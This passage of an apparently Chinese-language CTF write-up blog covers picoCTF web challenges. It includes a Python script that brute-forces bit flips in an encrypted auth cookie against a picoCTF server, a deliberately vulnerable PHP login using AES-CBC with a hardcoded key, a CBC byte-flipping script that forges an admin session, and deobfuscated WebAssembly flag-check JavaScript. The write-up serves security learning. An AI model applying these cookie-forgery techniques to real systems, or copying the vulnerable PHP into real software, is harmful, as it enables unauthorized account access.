<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bit flip code based on https://crypto.stackexchange.com/a/66086.</span></span><br><span class="line"><span class="comment"># we need to decode from base64 twice because the cookie was encoded twice.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit_flip</span>(<span class="params">pos, bit, data</span>):</span></span><br><span class="line">    raw = b64decode(b64decode(data).decode())</span><br><span class="line">    list1 = <span class="built_in">bytearray</span>(raw)</span><br><span class="line">    list1[pos] = list1[pos] ^ bit</span><br><span class="line">    raw = <span class="built_in">bytes</span>(list1)</span><br><span class="line">    <span class="keyword">return</span> b64encode(b64encode(raw)).decode()</span><br><span class="line"></span><br><span class="line">cookie = <span class="string">&quot;QnZkTU9DdjB1NWtDMmJUdDBKSTJRTzFSdFBSMUpzVUx3UitrcnZEbjFYcHdPSGF3UHVrbGFWb0w5MlZZRU9vUWRkdG5USDcwdmZzWFhYcXVxOEQyelBJc3NCT2ZnVlhUSXM2RGRNMlR2cjRRVUFwaldtakZQTUNGcmtoSGpIN1U=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> position_idx <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">10</span>), desc=<span class="string">&quot;Bruteforcing Position&quot;</span>):</span><br><span class="line"><span class="comment">#def position(position_idx):</span></span><br><span class="line">    <span class="comment"># The 96 really should be 128 to test every bit, but 96 worked for me.</span></span><br><span class="line">    <span class="keyword">for</span> bit_idx <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">96</span>), desc=<span class="string">&quot;%i Bruteforcing Bit&quot;</span>%position_idx):</span><br><span class="line">        auth_cookie = bit_flip(position_idx, bit_idx, cookie)</span><br><span class="line">        cookies = &#123;<span class="string">&#x27;auth_name&#x27;</span>: auth_cookie&#125;</span><br><span class="line">        r = requests.get(<span class="string">&#x27;http://mercury.picoctf.net:10868/&#x27;</span>, cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;picoCTF&#123;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># The flag is between `&lt;code&gt;` and `&lt;/code&gt;`</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Flag: &quot;</span> + r.text.split(<span class="string">&quot;&lt;code&gt;&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;&lt;/code&gt;&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#Pool().map(position,range(10))</span></span><br></pre></td></tr></table></figure>
<p>尝试使用进程池失败，<br>脚本输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0 Bruteforcing Bit: 100%|███████████████████████████████████████| 96/96 [01:06&lt;00:00,  1.45it/s]</span><br><span class="line">1 Bruteforcing Bit: 100%|███████████████████████████████████████| 96/96 [01:10&lt;00:00,  1.36it/s]</span><br><span class="line">2 Bruteforcing Bit: 100%|███████████████████████████████████████| 96/96 [01:06&lt;00:00,  1.44it/s]</span><br><span class="line">3 Bruteforcing Bit: 100%|███████████████████████████████████████| 96/96 [01:10&lt;00:00,  1.37it/s]</span><br><span class="line">4 Bruteforcing Bit: 100%|███████████████████████████████████████| 96/96 [01:11&lt;00:00,  1.34it/s]</span><br><span class="line">5 Bruteforcing Bit: 100%|███████████████████████████████████████| 96/96 [01:10&lt;00:00,  1.35it/s]</span><br><span class="line">6 Bruteforcing Bit: 100%|███████████████████████████████████████| 96/96 [01:10&lt;00:00,  1.37it/s]</span><br><span class="line">7 Bruteforcing Bit: 100%|███████████████████████████████████████| 96/96 [01:10&lt;00:00,  1.35it/s]</span><br><span class="line">8 Bruteforcing Bit: 100%|███████████████████████████████████████| 96/96 [01:07&lt;00:00,  1.41it/s]</span><br><span class="line">Bruteforcing Position:  90%|█████████████████████████████████▎   | 9/10 [10:24&lt;01:09, 69.63s/itFlag: picoCTF&#123;cO0ki3s_yum_e57b2438&#125;                               | 1/96 [00:00&lt;01:06,  1.43it/s]</span><br><span class="line">9 Bruteforcing Bit:   1%|▍                                       | 1/96 [00:02&lt;03:32,  2.24s/it]</span><br><span class="line">Bruteforcing Position: 100%|████████████████████████████████████| 10/10 [10:27&lt;00:00, 62.72s/it]</span><br><span class="line">                                         </span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="CBC字节反转攻击"><a href="#CBC字节反转攻击" class="headerlink" title="CBC字节反转攻击"></a>CBC字节反转攻击</h2><p>源码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="meta-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Login Form<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;static/css/style.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;static/js/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">	$(<span class="string">&quot;.username&quot;</span>).focus(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		$(<span class="string">&quot;.user-icon&quot;</span>).css(<span class="string">&quot;left&quot;</span>,<span class="string">&quot;-48px&quot;</span>);</span></span><br><span class="line"><span class="javascript">	&#125;);</span></span><br><span class="line"><span class="javascript">	$(<span class="string">&quot;.username&quot;</span>).blur(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		$(<span class="string">&quot;.user-icon&quot;</span>).css(<span class="string">&quot;left&quot;</span>,<span class="string">&quot;0px&quot;</span>);</span></span><br><span class="line"><span class="javascript">	&#125;);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">	$(<span class="string">&quot;.password&quot;</span>).focus(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		$(<span class="string">&quot;.pass-icon&quot;</span>).css(<span class="string">&quot;left&quot;</span>,<span class="string">&quot;-48px&quot;</span>);</span></span><br><span class="line"><span class="javascript">	&#125;);</span></span><br><span class="line"><span class="javascript">	$(<span class="string">&quot;.password&quot;</span>).blur(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		$(<span class="string">&quot;.pass-icon&quot;</span>).css(<span class="string">&quot;left&quot;</span>,<span class="string">&quot;0px&quot;</span>);</span></span><br><span class="line"><span class="javascript">	&#125;);</span></span><br><span class="line"><span class="javascript">&#125;);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">define(&quot;SECRET_KEY&quot;, &#x27;9999999999999999&#x27;);</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">function get_random_iv()&#123;</span><br><span class="line">    $random_iv=&#x27;&#x27;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function login($info)&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[&#x27;username&#x27;] = $info[&#x27;username&#x27;];</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&#x27;cipher&#x27;]) &amp;&amp; isset($_COOKIE[&#x27;iv&#x27;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&#x27;cipher&#x27;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;<span class="tag">&lt;<span class="name">p</span>&gt;</span>base64_decode(&#x27;&quot;.base64_encode($plain).&quot;&#x27;) can&#x27;t unserialize<span class="tag">&lt;/<span class="name">p</span>&gt;</span>&quot;);</span><br><span class="line">            $_SESSION[&#x27;username&#x27;] = $info[&#x27;username&#x27;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]===&#x27;admin&#x27;)&#123;</span><br><span class="line">        echo &#x27;<span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello admin<span class="tag">&lt;/<span class="name">p</span>&gt;</span>&#x27;;</span><br><span class="line">        echo &#x27;<span class="tag">&lt;<span class="name">p</span>&gt;</span>Flag is ctf&#123;123cbcchange&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span>&#x27;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;<span class="tag">&lt;<span class="name">p</span>&gt;</span>hello &#x27;.$_SESSION[&#x27;username&#x27;].&#x27;<span class="tag">&lt;/<span class="name">p</span>&gt;</span>&#x27;;</span><br><span class="line">        echo &#x27;<span class="tag">&lt;<span class="name">p</span>&gt;</span>Only admin can see flag<span class="tag">&lt;/<span class="name">p</span>&gt;</span>&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#x27;<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;loginout.php&quot;</span>&gt;</span>Log out<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123;</span><br><span class="line">    $username = (string)$_POST[&#x27;username&#x27;];</span><br><span class="line">    $password = (string)$_POST[&#x27;password&#x27;];</span><br><span class="line">    if($username === &#x27;admin&#x27;)&#123;</span><br><span class="line">        exit(&#x27;<span class="tag">&lt;<span class="name">p</span>&gt;</span>admin are not allowed to login<span class="tag">&lt;/<span class="name">p</span>&gt;</span>&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&#x27;username&#x27;=&gt;$username,&#x27;password&#x27;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;<span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">&quot;login-body&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;user-icon&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pass-icon&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;login-form&quot;</span> <span class="attr">class</span>=<span class="string">&quot;login-form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;header&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Login Form<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span>&gt;</span>Fill out the form below to login to my super awesome imaginary control panel.<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Username&quot;</span> <span class="attr">onfocus</span>=<span class="string">&quot;this.value=\&#x27;\&#x27;&quot;</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Password&quot;</span> <span class="attr">onfocus</span>=<span class="string">&quot;this.value=\&#x27;\&#x27;&quot;</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">body</span>&gt;</span>&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>明文16字节为一组进行分组加密<br>拒绝admin账户的登录，使用cbc字节翻转攻击<br>构造登录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;userna</span><br><span class="line">me&quot;;s:5:&quot;admix&quot;;</span><br><span class="line">s:8:&quot;password&quot;;s</span><br><span class="line">:2:&quot;123&quot;;&#125;　</span><br></pre></td></tr></table></figure>
<p>通过翻转<code>X</code>字符将admin账户传入。<br>更改密文后构造vi修复初始密文<br>解题脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf8 -*-</span><br><span class="line">import base64</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line"># a:2:&#123;s:8:&quot;userna</span><br><span class="line"># me&quot;;s:5:&quot;admiN&quot;;</span><br><span class="line"># s:8:&quot;password&quot;;s</span><br><span class="line"># :6:&quot;123&quot;;&#125;</span><br><span class="line"> </span><br><span class="line">#原始cipher</span><br><span class="line">ciphertext = &#x27;w1uvgfzxxuYHA%2Bo08ZL%2BCefhwr2jHuwglOIBAh8cP1w5TCiCmY0Yy%2BQxelAl9%2B%2FiZeRvLD7UjzlF58bTGFZ%2BWQ%3D%3D&#x27;</span><br><span class="line"></span><br><span class="line">cipher = base64.b64decode(urllib.parse.unquote(ciphertext))</span><br><span class="line">array_cipher = bytearray(cipher)</span><br><span class="line">array_cipher[13] =  array_cipher[13]^ ord(&#x27;N&#x27;) ^ ord(&#x27;n&#x27;)</span><br><span class="line">#print(array_cipher)</span><br><span class="line">print(&#x27;newCipher:&#x27;,urllib.parse.quote(base64.b64encode(array_cipher)))</span><br><span class="line"></span><br><span class="line">#解密后的明文base64</span><br><span class="line">decode_plain = base64.b64decode(&#x27;sxvY7wUlyPgC+/iV7InfjG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==&#x27;)</span><br><span class="line">#原始iv</span><br><span class="line">iv = base64.b64decode(urllib.parse.unquote(&#x27;1HxERxo2%2FTuymbrPoVDB%2Bw%3D%3D&#x27;))</span><br><span class="line">#原始明文</span><br><span class="line">plain = &#x27;a:2:&#123;s:8:&quot;userna&#x27;</span><br><span class="line"></span><br><span class="line">newiv = list(iv)</span><br><span class="line"></span><br><span class="line">for i in range(16):</span><br><span class="line">    newiv[i] = (ord(plain[i].encode(&#x27;utf-8&#x27;)) ^ iv[i] ^ decode_plain[i])</span><br><span class="line"></span><br><span class="line">newiv = bytes(newiv)</span><br><span class="line"></span><br><span class="line">print(&#x27;newiv:&#x27;,urllib.parse.quote(base64.b64encode(newiv)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="Some-Assembly-Required-1"><a href="#Some-Assembly-Required-1" class="headerlink" title="Some Assembly Required 1"></a>Some Assembly Required 1</h2><p>javascript-obfuscator解混淆</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">const _0x6d8f = [</span><br><span class="line">  &#x27;copy_char&#x27;,</span><br><span class="line">  &#x27;value&#x27;,</span><br><span class="line">  &#x27;207aLjBod&#x27;,</span><br><span class="line">  &#x27;1301420SaUSqf&#x27;,</span><br><span class="line">  &#x27;233ZRpipt&#x27;,</span><br><span class="line">  &#x27;2224QffgXU&#x27;,</span><br><span class="line">  &#x27;check_flag&#x27;,</span><br><span class="line">  &#x27;408533hsoVYx&#x27;,</span><br><span class="line">  &#x27;instance&#x27;,</span><br><span class="line">  &#x27;278338GVFUrH&#x27;,</span><br><span class="line">  &#x27;Correct!&#x27;,</span><br><span class="line">  &#x27;549933ZVjkwI&#x27;,</span><br><span class="line">  &#x27;innerHTML&#x27;,</span><br><span class="line">  &#x27;charCodeAt&#x27;,</span><br><span class="line">  &#x27;./aD8SvhyVkb&#x27;,</span><br><span class="line">  &#x27;result&#x27;,</span><br><span class="line">  &#x27;977AzKzwq&#x27;,</span><br><span class="line">  &#x27;Incorrect!&#x27;,</span><br><span class="line">  &#x27;exports&#x27;,</span><br><span class="line">  &#x27;length&#x27;,</span><br><span class="line">  &#x27;getElementById&#x27;,</span><br><span class="line">  &#x27;1jIrMBu&#x27;,</span><br><span class="line">  &#x27;input&#x27;,</span><br><span class="line">  &#x27;615361geljRK&#x27;</span><br><span class="line">];</span><br><span class="line">const _0x5c00 = function (_0x58505a, _0x4d6e6c) &#123;</span><br><span class="line">  _0x58505a = _0x58505a - 195;</span><br><span class="line">  let _0x6d8fc4 = _0x6d8f[_0x58505a];</span><br><span class="line">  return _0x6d8fc4;</span><br><span class="line">&#125;;</span><br><span class="line">(function (_0x12fd07, _0x4e9d05) &#123;</span><br><span class="line">  const _0x4f7b75 = _0x5c00;</span><br><span class="line">  while (!![]) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      const _0x1bb902 = - parseInt(_0x4f7b75(200)) * - parseInt(_0x4f7b75(201)) + - parseInt(_0x4f7b75(205)) + parseInt(_0x4f7b75(207)) + parseInt(_0x4f7b75(195)) + - parseInt(_0x4f7b75(198)) * parseInt(_0x4f7b75(212)) + parseInt(_0x4f7b75(203)) + - parseInt(_0x4f7b75(217)) * parseInt(_0x4f7b75(199));</span><br><span class="line">      if (_0x1bb902 === _0x4e9d05) break;</span><br><span class="line">       else _0x12fd07[&#x27;push&#x27;](_0x12fd07[&#x27;shift&#x27;]());</span><br><span class="line">    &#125; catch (_0x4f8a) &#123;</span><br><span class="line">      _0x12fd07[&#x27;push&#x27;](_0x12fd07[&#x27;shift&#x27;]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;(_0x6d8f, 310022));</span><br><span class="line">let exports;</span><br><span class="line">(async() =&gt;&#123;</span><br><span class="line">  const _0x835967 = _0x5c00;</span><br><span class="line">  let _0x1adb5f = awaitfetch(_0x835967(210)),</span><br><span class="line">  _0x355961 = awaitWebAssembly[&#x27;instantiate&#x27;](await_0x1adb5f[&#x27;arrayBuffer&#x27;]()),</span><br><span class="line">  _0x5c0ffa = _0x355961[_0x835967(204)];</span><br><span class="line">  exports = _0x5c0ffa[_0x835967(214)];</span><br><span class="line">&#125;) ();</span><br><span class="line">function onButtonPress() &#123;</span><br><span class="line">  const _0x50ea62 = _0x5c00;</span><br><span class="line">  let _0x5f4170 = document[_0x50ea62(216)](_0x50ea62(218)) [_0x50ea62(197)];</span><br><span class="line">  for (let _0x19d3ca = 0; _0x19d3ca &lt; _0x5f4170[&#x27;length&#x27;]; _0x19d3ca++) &#123;</span><br><span class="line">    exports[_0x50ea62(196)](_0x5f4170[_0x50ea62(209)](_0x19d3ca), _0x19d3ca);</span><br><span class="line">  &#125;</span><br><span class="line">  exports[&#x27;copy_char&#x27;](0, _0x5f4170[_0x50ea62(215)]),</span><br><span class="line">  exports[_0x50ea62(202)]() == 1 ? document[&#x27;getElementById&#x27;](_0x50ea62(211)) [_0x50ea62(208)] = _0x50ea62(206)  : document[_0x50ea62(216)](_0x50ea62(211)) [&#x27;innerHTML&#x27;] = _0x50ea62(213);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>下载了一个通过webAssembly打包的js文件，flag以明文形式储存在文件中。<br>ob混淆还是不会做。。。。</p>
<h2 id="Who-are-you"><a href="#Who-are-you" class="headerlink" title="Who are you?"></a>Who are you?</h2><p>新颖的http头题</p>
